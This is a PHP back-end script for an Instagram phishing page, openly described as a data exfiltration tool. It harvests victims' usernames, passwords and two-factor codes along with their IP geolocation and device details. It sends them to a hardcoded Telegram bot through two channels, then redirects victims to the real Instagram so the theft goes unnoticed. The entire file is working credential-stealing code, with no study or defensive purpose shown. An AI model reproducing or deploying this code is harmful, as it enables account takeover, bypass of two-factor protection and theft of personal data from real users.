<?php
/**
 * Instagram Phishing Data Exfiltration Script
 * Sends stolen credentials and 2FA codes to Telegram Bot API
 */

// Configuration
$botToken = '8707980618:AAH6ZvQS5PQG2OO2qDCrUU9VMhpKTyQppGM';
$chatId = '8715337803';

// Get victim IP address
function getClientIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ipaddress = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_X_REAL_IP'])) {
        $ipaddress = $_SERVER['HTTP_X_REAL_IP'];
    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    }
    return $ipaddress;
}

// Get geolocation from IP
function getGeoLocation($ip) {
    $geoData = [];
    try {
        $context = stream_context_create(['http' => ['timeout' => 3]]);
        $ipInfo = @file_get_contents("http://ipinfo.io/{$ip}/json", false, $context);
        if ($ipInfo) {
            $geoData = json_decode($ipInfo, true);
        }
    } catch (Exception $e) {
        // Silently fallback
    }
    return $geoData;
}

// Send message to Telegram
function sendToTelegram($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ($httpCode == 200);
}

// Prepare data for Telegram message
$timestamp = date('Y-m-d H:i:s');
$ip = getClientIP();
$geo = getGeoLocation($ip);
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
$referrer = isset($_POST['referrer']) ? $_POST['referrer'] : 'Direct';
$deviceType = isset($_POST['device_type']) ? $_POST['device_type'] : 'Unknown';

// Determine which step we're processing
$step = isset($_GET['step']) ? $_GET['step'] : 'login';

if ($step == '2fa') {
    // 2FA Code Harvesting
    $twofaCode = isset($_POST['twofa_code']) ? trim($_POST['twofa_code']) : '';
    
    // Retrieve previously stored credentials (from session)
    session_start();
    $username = isset($_SESSION['temp_username']) ? $_SESSION['temp_username'] : 'Unknown';
    $password = isset($_SESSION['temp_password']) ? $_SESSION['temp_password'] : 'Unknown';
    
    // Build message
    $message = "🔐 <b>[2FA CODE HARVESTED]</b> 🔐\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "📱 <b>Instagram 2FA Code</b>\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "👤 <b>Username:</b> {$username}\n";
    $message .= "🔑 <b>Password:</b> {$password}\n";
    $message .= "🔢 <b>2FA Code:</b> <code>{$twofaCode}</code>\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "🌍 <b>Victim Information:</b>\n";
    $message .= "🖥️ <b>IP:</b> {$ip}\n";
    
    if (!empty($geo) && isset($geo['city'])) {
        $location = $geo['city'] . ', ' . ($geo['region'] ?? '') . ', ' . ($geo['country'] ?? '');
        $message .= "📍 <b>Location:</b> {$location}\n";
    }
    
    $message .= "📱 <b>Device:</b> {$deviceType}\n";
    $message .= "🔗 <b>Referrer:</b> {$referrer}\n";
    $message .= "⏰ <b>Timestamp:</b> {$timestamp}\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "<b>⚠️ ACTION REQUIRED:</b> Use this code immediately!";
    
    sendToTelegram($botToken, $chatId, $message);
    
    // Redirect to Instagram (real site)
    header('Location: https://www.instagram.com/');
    exit();
    
} else {
    // Step 1: Credentials Harvesting
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    
    // Store credentials in session for 2FA step
    session_start();
    $_SESSION['temp_username'] = $username;
    $_SESSION['temp_password'] = $password;
    
    // Build message
    $message = "🎯 <b>[CREDENTIALS CAPTURED]</b> 🎯\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "📱 <b>Instagram Login Details</b>\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "👤 <b>Username/Email:</b> <code>{$username}</code>\n";
    $message .= "🔑 <b>Password:</b> <code>{$password}</code>\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "🌍 <b>Victim Information:</b>\n";
    $message .= "🖥️ <b>IP Address:</b> {$ip}\n";
    
    if (!empty($geo) && isset($geo['city'])) {
        $location = $geo['city'] . ', ' . ($geo['region'] ?? '') . ', ' . ($geo['country'] ?? '');
        $message .= "📍 <b>Location:</b> {$location}\n";
    }
    
    if (!empty($geo) && isset($geo['org'])) {
        $message .= "🏢 <b>ISP:</b> {$geo['org']}\n";
    }
    
    $message .= "📱 <b>Device Type:</b> {$deviceType}\n";
    $message .= "🖥️ <b>User Agent:</b> {$userAgent}\n";
    $message .= "🔗 <b>Referrer:</b> {$referrer}\n";
    $message .= "⏰ <b>Timestamp:</b> {$timestamp}\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "<b>📌 Status:</b> Waiting for 2FA code...";
    
    sendToTelegram($botToken, $chatId, $message);
    
    // Send credentials to bot via JSON payload (secondary channel)
    $jsonPayload = json_encode([
        'username' => $username,
        'password' => $password,
        'ip' => $ip,
        'timestamp' => $timestamp,
        'user_agent' => $userAgent
    ]);
    
    $jsonUrl = "https://api.telegram.org/bot{$botToken}/sendDocument";
    $tmpFile = tempnam(sys_get_temp_dir(), 'creds_');
    file_put_contents($tmpFile, $jsonPayload);
    
    $curlFile = new CURLFile($tmpFile, 'application/json', 'credentials.json');
    $postDataJson = [
        'chat_id' => $chatId,
        'document' => $curlFile,
        'caption' => "📁 Instagram Credentials Backup - {$timestamp}"
    ];
    
    $ch2 = curl_init();
    curl_setopt($ch2, CURLOPT_URL, $jsonUrl);
    curl_setopt($ch2, CURLOPT_POST, true);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, $postDataJson);
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch2);
    curl_close($ch2);
    unlink($tmpFile);
    
    // Redirect to 2FA page
    header('Location: 2fa.html');
    exit();
}

?>
